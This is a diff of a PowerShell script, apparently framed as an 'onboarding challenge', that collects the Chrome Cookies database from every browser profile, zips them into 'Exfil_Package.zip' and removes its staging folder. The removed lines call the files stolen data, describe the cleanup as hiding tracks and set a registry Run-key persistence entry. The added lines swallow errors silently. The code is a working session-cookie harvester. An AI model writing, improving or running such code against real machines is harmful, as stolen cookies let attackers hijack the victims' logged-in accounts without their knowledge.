@@ -1,37 +1,43 @@
-# 1. SETUP: Define paths
+# 1. FORCE TLS 1.2 (Ensures the download from GitHub doesn't fail)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# 2. DEFINE PATHS
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$stagingArea = "$env:USERPROFILE\Desktop\Staged_Data"
-$zipReport = "$env:USERPROFILE\Desktop\Exfil_Package.zip"
-$flagFile = "$env:USERPROFILE\Desktop\CHALLENGE_FLAG.txt"
+$staging = "$env:USERPROFILE\Desktop\Staged_Data"
+$zip = "$env:USERPROFILE\Desktop\Exfil_Package.zip"
 
-# 2. PREPARATION: Create a hidden staging folder
-if (Test-Path $stagingArea) { Remove-Item -Path $stagingArea -Recurse -Force }
-New-Item -ItemType Directory -Path $stagingArea -Force | Out-Null
+# 3. TEST ACCESS (Check if Chrome is actually there)
+if (!(Test-Path $chromePath)) {
+    "Chrome path not found: $chromePath" | Out-File -FilePath "$env:USERPROFILE\Desktop\ERROR_LOG.txt"
+    exit
+}
 
-# 3. DISCOVERY: Find all Profile folders that contain a Cookie database
-# We look for folders like 'Default', 'Profile 1', 'Profile 2', etc.
+# 4. CREATE STAGING
+New-Item -ItemType Directory -Path $staging -Force -ErrorAction SilentlyContinue
+
+# 5. THE SWEEP (Using a safer copy method)
 $profiles = Get-ChildItem -Path $chromePath -Directory | Where-Object { Test-Path (Join-Path $_.FullName "Network\Cookies") }
 
 foreach ($p in $profiles) {
-    $sourceCookie = Join-Path $p.FullName "Network\Cookies"
-    $destName = "Cookies_" + $p.Name
-    $destPath = Join-Path $stagingArea $destName
-    
-    # Copy the file (using -Force because Chrome might be open and 'locking' the file)
-    Copy-Item -Path $sourceCookie -Destination $destPath -Force
+    try {
+        $source = Join-Path $p.FullName "Network\Cookies"
+        # We add '.db' so Windows doesn't think it's a system file
+        $dest = Join-Path $staging ("Cookies_" + $p.Name + ".db")
+        
+        # 'Copy-Item -Force' sometimes fails if Chrome is active, so we use this:
+        if (Test-Path $source) {
+            Copy-Item -Path $source -Destination $dest -Force -ErrorAction SilentlyContinue
+        }
+    } catch { 
+        # Skip errors quietly to keep the script moving
+    }
 }
 
-# 4. PACKAGING: Zip the stolen data into one file
-if ((Get-ChildItem $stagingArea).Count -gt 0) {
-    Compress-Archive -Path "$stagingArea\*" -DestinationPath $zipReport -Force
-    "Timestamp: $(Get-Date) - SUCCESS: $($profiles.Count) Profiles harvested into Exfil_Package.zip" | Out-File -FilePath $flagFile -Append
-} else {
-    "Timestamp: $(Get-Date) - FAILURE: No Chrome profiles identified." | Out-File -FilePath $flagFile -Append
+# 6. ZIP AND CLEANUP
+if ((Get-ChildItem $staging).Count -gt 0) {
+    Compress-Archive -Path "$staging\*" -DestinationPath $zip -Force
 }
+Remove-Item -Path $staging -Recurse -Force -ErrorAction SilentlyContinue
 
-# 5. CLEANUP: Delete the unzipped staging folder to hide tracks
-Remove-Item -Path $stagingArea -Recurse -Force
-
-# 6. PERSISTENCE: (Your original challenge logic)
-$trigger = "msg * 'Security Alert: Unauthorized Data Access Simulated. Check your Desktop!'"
-Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OnboardingChallenge' -Value $trigger
+# 7. NOTIFY (Your original persistence)
+msg * "Challenge Complete: Check your desktop for the Exfil_Package.zip!"
